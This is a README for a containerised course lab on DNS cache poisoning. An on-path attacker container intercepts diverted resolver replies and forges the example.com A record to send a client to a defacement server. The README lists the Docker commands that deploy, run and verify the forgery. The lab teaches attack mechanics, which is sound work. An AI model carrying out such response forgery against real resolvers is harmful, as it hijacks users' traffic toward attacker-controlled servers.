# Phase 2 — On-Path Response Forgery

Carries over the full Phase 1 deployment and adds an on-path adversary on the **resolver
subnet** that poisons the resolver's cache for `example.com`, redirecting the client's web
traffic to a rogue server — while every other name resolves normally.

## What's added over Phase 1

| Container | Address      | Role                                                        |
|-----------|--------------|-------------------------------------------------------------|
| rogue-web | 172.16.1.30  | adversary's webserver serving the defacement page           |
| attacker  | 172.16.2.100 | on-path interceptor (C/libpcap), `NET_RAW` + `NET_ADMIN`    |

- **Diversion (router only).** `diversion/divert-on.sh` adds `ip route replace 172.16.2.10/32
  via 172.16.2.100` on **core-router**, so every reply bound for the resolver is sent to the
  attacker first. The resolver and nameservers keep their Phase 1 config untouched.
- **Interceptor (`attack/interceptor.c`).** A transparent L2 relay: for each diverted reply it
  rewrites the Ethernet destination to the resolver's real MAC and `pcap_inject`s it onward, so
  the resolver receives exactly one answer per query (we are the sole deliverer — no race). In
  `forge` mode it rewrites **only** the `A` record whose owner is `example.com` (answer section)
  to `172.16.1.30`; referrals, glue, and `www.example.com` are relayed byte-for-byte. It
  recomputes the IP+UDP checksums on every injected frame. It does **not** enable IP forwarding
  (only `NET_RAW` for libpcap) — consistent with the privilege policy.

> **Important:** every non-router node sets `net.ipv4.ip_forward=0` (compose `sysctls:`).
> Containers inherit `ip_forward=1` from the Docker VM otherwise, which would let the attacker's
> *kernel* forward the genuine reply and defeat the forgery (and violate "only routers forward").

## Deploy

```bash
docker build -t cs6008-dnslab:base ../common      # if not already built
docker compose up -d
docker exec attacker make -C /attack              # build the interceptor (libpcap)
```

## Verify (2.2) — transparent relay, forging disabled

```bash
docker exec core-router sh /diversion/divert-on.sh
docker exec -d attacker sh -c "exec /attack/interceptor eth0 172.16.2.10 172.16.1.30 relay > /tmp/relay.log 2>&1"
docker exec resolver rndc -c /etc/bind/rndc.conf flush
docker exec client dig +short example.com          # -> 172.16.1.20 (real, relayed)
docker exec client curl -s http://example.com       # -> legitimate page
```

## Attack (2.3) — enable forging

```bash
docker exec attacker pkill -f interceptor
docker exec -d attacker sh -c "exec /attack/interceptor eth0 172.16.2.10 172.16.1.30 forge > /tmp/forge.log 2>&1"
docker exec resolver rndc -c /etc/bind/rndc.conf flush
docker exec client dig +short example.com          # -> 172.16.1.30  (poisoned)
docker exec client dig +short www.example.com       # -> 172.16.1.20  (untouched)
docker exec client curl -s http://example.com       # -> DEFACED page
```

Capture during the attack (on the attacker's NIC):

```bash
docker exec -d attacker sh -c "exec tcpdump -i eth0 -n -U -w /tmp/p2.pcap udp port 53"
# ... run the attack ...
docker exec attacker pkill -INT tcpdump
docker exec attacker tshark -r /tmp/p2.pcap -n -Y dns
```

## Files

- `compose.yml` — Phase 1 plus `rogue-web`, `attacker`, diversion mount, `ip_forward=0` on non-routers.
- `attack/interceptor.c`, `attack/Makefile` — the C/libpcap on-path forger (relay + forge modes).
- `diversion/divert-on.sh`, `divert-off.sh` — the core-router diversion route (router-only change).
- `config/`, `www/`, `rogue-www/` — carried-over zones/daemons, legit page, defacement page.
- `config/resolver/rndc.{key,conf}` — localhost control channel for in-place cache flushing.
- `evidence/` — relay verify, attack results, annotated capture, poisoned cache, non-target lookup.
